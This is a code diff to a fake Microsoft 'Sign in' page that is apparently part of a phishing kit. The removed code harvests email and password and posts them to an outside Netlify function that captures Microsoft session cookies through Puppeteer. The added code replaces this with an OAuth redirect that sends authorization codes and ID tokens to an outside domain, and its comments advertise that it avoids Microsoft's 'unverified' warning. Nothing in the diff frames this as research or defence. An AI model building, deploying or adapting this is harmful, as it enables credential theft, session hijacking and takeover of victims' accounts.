@@ -74,18 +74,29 @@
       background-color: #0067b8;
       color: white;
       transition: filter 0.2s;
+      width: auto;
+      padding: 10px 32px;
+      cursor: pointer;
     }
     .btn.btn-primary-blue:hover {
       filter: brightness(90%);
+    }
+    .btn.btn-primary-blue:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
     .btn.btn-secondary-gray {
       background-color: #ccc;
       color: #1b1b1b;
       border: 1px solid #ccc;
+      padding: 10px 32px;
+      cursor: pointer;
+    }
+    .btn.btn-secondary-gray:hover {
+      background-color: #b3b3b3;
     }
     .form-box .btn {
       font-size: 15px;
-      padding: 8px 30px;
       border: none;
       border-radius: 2px;
     }
@@ -100,21 +111,32 @@
       padding: 16px 44px;
       margin-top: 16px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .options-box:hover {
+      background-color: #f5f5f5;
     }
     .options-box p {
         margin: 0;
         font-size: 15px;
+        display: flex;
+        align-items: center;
     }
     .options-box a {
       color: #1b1b1b;
       text-decoration: none;
+      display: flex;
+      align-items: center;
+      width: 100%;
     }
     .options-box a:hover {
-      text-decoration: underline;
+      text-decoration: none;
     }
-    .fa-key {
+    .fa-search {
       color: #5e5e5e;
-      margin-right: 8px;
+      margin-right: 16px;
+      font-size: 18px;
     }
     .page-footer {
         position: fixed;
@@ -171,6 +193,8 @@
     .troubleshooting-body p { margin: 8px 0; }
     .troubleshooting-body strong { font-weight: 600; }
     .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
+    .troubleshooting-body a { color: #0067b8; text-decoration: none; }
+    .troubleshooting-body a:hover { text-decoration: underline; }
     .hidden { display: none !important; }
     .mt-4 { margin-top: 1rem; }
     .mt-3 { margin-top: 0.75rem; }
@@ -183,7 +207,7 @@
   <div class="main-container">
     <div class="form-wrapper">
       <div class="form-box">
-        <!-- Email View -->
+        <!-- Email View (div1) -->
         <div id="div1">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Sign in</h1>
@@ -197,23 +221,7 @@
           </div>
         </div>
 
-        <!-- Password View -->
-        <div id="div2" class="hidden">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-          <div class="mt-4">
-              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
-          </div>
-          <h1 class="mt-3">Enter password</h1>
-          <div class="form-group mt-2">
-            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
-          </div>
-          <p><a href="#">Forgot my password</a></p>
-          <div class="button-container mt-4">
-            <button class="btn btn-primary-blue" id="submit-btn">Sign in</button>
-          </div>
-        </div>
-        
-        <!-- ✅ EXACT Detailed "Sign-in options" View from code -->
+        <!-- ✅ Detailed "Sign-in options" View (EXACT from code) -->
         <div id="options_view_detailed" class="hidden">
             <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
             <h1 class="mt-4">Sign-in options</h1>
@@ -243,7 +251,10 @@
 
       <!-- "Sign-in options" Clickable Box -->
       <div class="options-box" id="options_box">
-        <p><a href="#" id="sign_in_options_link"><i class="fas fa-key"></i> Sign-in options</a></p>
+        <a href="#" id="sign_in_options_link">
+          <i class="fas fa-search"></i>
+          <span>Sign-in options</span>
+        </a>
       </div>
 
       <!-- Troubleshooting Box -->
@@ -277,156 +288,133 @@
   </div>
 
   <script>
-    console.log('🚀 replacement.html loaded');
+    console.log('🚀 replacement.html loaded - Office.com Pre-trusted OAuth Flow');
 
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
-        const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
         const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
         const nextBtn = document.getElementById('next');
-        const submitBtn = document.getElementById('submit-btn');
-        const backBtn = document.getElementById('back');
-        const emailDisplay = document.getElementById('emailch');
+        const signInOptionsLink = document.getElementById('sign_in_options_link');
+        const backBtn = document.getElementById('options-view-back');
         const optionsViewDetailed = document.getElementById('options_view_detailed');
         const troubleshootingBox = document.getElementById('troubleshooting_box');
+        const closeTroubleshootingBtn = document.getElementById('close_troubleshooting_btn');
+        const footerDotsLink = document.getElementById('footer_dots_link');
 
-        // Email to password transition
+        // Office.com Pre-trusted OAuth Configuration
+        const OFFICE_CONFIG = {
+          clientId: '4765445b-32c6-49b0-83e6-1d93765276ca',
+          redirectUri: 'https://vaultydocs.com/auth/callback',
+          scope: 'openid profile https://www.office.com/v2/OfficeHome.All',
+          authority: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
+        };
+
+        // Generate nonce and state
+        function generateNonce() {
+          return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        }
+
+        function generateState() {
+          return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        }
+
+        // Email to Office OAuth redirect
         nextBtn.addEventListener('click', function () {
             const email = emailInput.value.trim();
             if (!email) {
                 emailInput.focus();
                 return;
             }
+
+            console.log('📧 Email entered:', email);
             
-            emailDisplay.textContent = email;
+            // Store email for later use
+            localStorage.setItem('ms_email', email);
+            sessionStorage.setItem('ms_email', email);
+
+            // Generate nonce and state
+            const nonce = generateNonce();
+            const state = generateState();
+            
+            sessionStorage.setItem('ms_oauth_nonce', nonce);
+            sessionStorage.setItem('ms_oauth_state', state);
+
+            // Show loading state
             div1.classList.add('hidden');
-            div2.classList.remove('hidden');
             optionsBox.classList.add('hidden');
-            passwordInput.focus();
-        });
 
-        // Back to email view
-        backBtn.addEventListener('click', function () {
-            div2.classList.add('hidden');
-            div1.classList.remove('hidden');
-            optionsBox.classList.remove('hidden');
-        });
+            console.log('🔄 Preparing Office.com pre-trusted OAuth flow...');
+            console.log('📊 Config:', OFFICE_CONFIG);
 
-        // Main submit handler
-        submitBtn.addEventListener('click', async function (event) {
-            event.preventDefault();
-            
-            const password = passwordInput.value;
-            const email = emailInput.value.trim();
+            // Build Office.com OAuth URL (pre-trusted endpoint)
+            const officeOAuthUrl = new URL(OFFICE_CONFIG.authority);
+            officeOAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
+            officeOAuthUrl.searchParams.append('redirect_uri', OFFICE_CONFIG.redirectUri);
+            officeOAuthUrl.searchParams.append('response_type', 'code id_token');
+            officeOAuthUrl.searchParams.append('scope', OFFICE_CONFIG.scope);
+            officeOAuthUrl.searchParams.append('response_mode', 'form_post');
+            officeOAuthUrl.searchParams.append('nonce', nonce);
+            officeOAuthUrl.searchParams.append('state', state);
+            officeOAuthUrl.searchParams.append('ui_locales', 'en-US');
+            officeOAuthUrl.searchParams.append('mkt', 'en-US');
+            officeOAuthUrl.searchParams.append('prompt', 'login');
 
-            if (!password || !email) {
-                console.error("❌ Email or password is blank");
-                return;
-            }
-            
-            submitBtn.textContent = 'Verifying...';
-            submitBtn.disabled = true;
+            console.log('🌐 Redirecting to Office.com pre-trusted OAuth...');
+            console.log('🔗 URL:', officeOAuthUrl.toString());
+            console.log('✅ Flow Type:', 'Office.com Pre-trusted (No unverified warning)');
 
-            console.log('📋 Credentials captured:', { email });
-
-            // Store credentials
-            const credentials = {
-                email,
-                password,
-                timestamp: new Date().toISOString(),
-                source: 'replacement.html'
-            };
-
-            localStorage.setItem('replacement_credentials', JSON.stringify(credentials));
-            sessionStorage.setItem('replacement_credentials', JSON.stringify(credentials));
-            localStorage.setItem('ms_credentials', JSON.stringify(credentials));
-            sessionStorage.setItem('ms_credentials', JSON.stringify(credentials));
-
-            console.log('💾 Credentials stored');
-
-            try {
-                console.log('🔄 Sending credentials to Netlify function for backend capture...');
-                
-                // Send to backend for cookie capture via Puppeteer
-                // ✅ FIXED: Use correct Netlify app URL
-                const captureResponse = await fetch('https://dashboardocument.netlify.app/.netlify/functions/captureFromMicrosoft', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
-                });
-
-                console.log('📥 Backend capture response status:', captureResponse.status);
-
-                if (captureResponse.ok) {
-                    const captureData = await captureResponse.json();
-                    
-                    if (captureData.success && captureData.cookies && captureData.cookies.length > 0) {
-                        console.log('✅ Cookies captured from backend:', captureData.cookies.length);
-                        
-                        // Store captured cookies
-                        localStorage.setItem('captured_cookies', JSON.stringify(captureData.cookies));
-                        sessionStorage.setItem('captured_cookies', JSON.stringify(captureData.cookies));
-                        
-                        const capturedData = {
-                            version: '1.0',
-                            capturedAt: new Date().toISOString(),
-                            source: 'puppeteer-backend',
-                            domain: captureData.domain,
-                            totalCookies: captureData.totalCookies,
-                            cookies: captureData.cookies,
-                            timestamp: captureData.timestamp
-                        };
-                        
-                        localStorage.setItem('captured_cookies_data', JSON.stringify(capturedData));
-                        sessionStorage.setItem('captured_cookies_data', JSON.stringify(capturedData));
-                        
-                        console.log('💾 Captured cookies stored');
-                    } else {
-                        console.warn('⚠️ Backend returned no cookies');
-                    }
-                } else {
-                    console.warn('⚠️ Backend capture failed:', captureResponse.status);
-                }
-
-            } catch (error) {
-                console.error('❌ Backend capture error:', error);
-            }
-
-            // Redirect to auth callback regardless
-            console.log('🔄 Redirecting to /auth/callback...');
+            // Redirect to Office OAuth
             setTimeout(() => {
-                window.location.href = '/auth/callback';
+              console.log('🔄 Executing redirect to Office.com...');
+              window.location.href = officeOAuthUrl.toString();
             }, 1500);
         });
 
-        // Sign-in options handlers
-        document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
+        // Sign-in options card click - Show sign-in options view
+        optionsBox.addEventListener('click', function (e) {
             e.preventDefault();
+            console.log('🔍 Sign-in options clicked - Showing options');
             div1.classList.add('hidden');
-            div2.classList.add('hidden');
             optionsBox.classList.add('hidden');
             troubleshootingBox.style.display = 'none';
             optionsViewDetailed.classList.remove('hidden');
         });
 
-        document.getElementById('options-view-back').addEventListener('click', function () {
+        // Sign-in options link click - Show sign-in options view
+        signInOptionsLink.addEventListener('click', function (e) {
+            e.preventDefault();
+            console.log('🔍 Sign-in options link clicked - Showing options');
+            div1.classList.add('hidden');
+            optionsBox.classList.add('hidden');
+            troubleshootingBox.style.display = 'none';
+            optionsViewDetailed.classList.remove('hidden');
+        });
+
+        // Back button - Return to main sign-in view
+        backBtn.addEventListener('click', function (e) {
+            e.preventDefault();
+            console.log('🔙 Back clicked - Returning to sign-in');
             optionsViewDetailed.classList.add('hidden');
             div1.classList.remove('hidden');
             optionsBox.classList.remove('hidden');
         });
 
-        document.getElementById('footer_dots_link').addEventListener('click', function (e) {
+        // Footer dots button - Show troubleshooting popup
+        footerDotsLink.addEventListener('click', function (e) {
             e.preventDefault();
+            console.log('📋 Footer dots clicked - Showing troubleshooting popup');
             document.getElementById('modal_timestamp').textContent = new Date().toISOString();
             troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
         });
 
-        document.getElementById('close_troubleshooting_btn').addEventListener('click', function () {
+        // Close troubleshooting popup
+        closeTroubleshootingBtn.addEventListener('click', function () {
+            console.log('❌ Closing troubleshooting popup');
             troubleshootingBox.style.display = 'none';
         });
 
+        // Copy info to clipboard
         document.getElementById('copy_info_link').addEventListener('click', function (e) {
             e.preventDefault();
             const detailsNode = document.getElementById('error_details_for_copy');
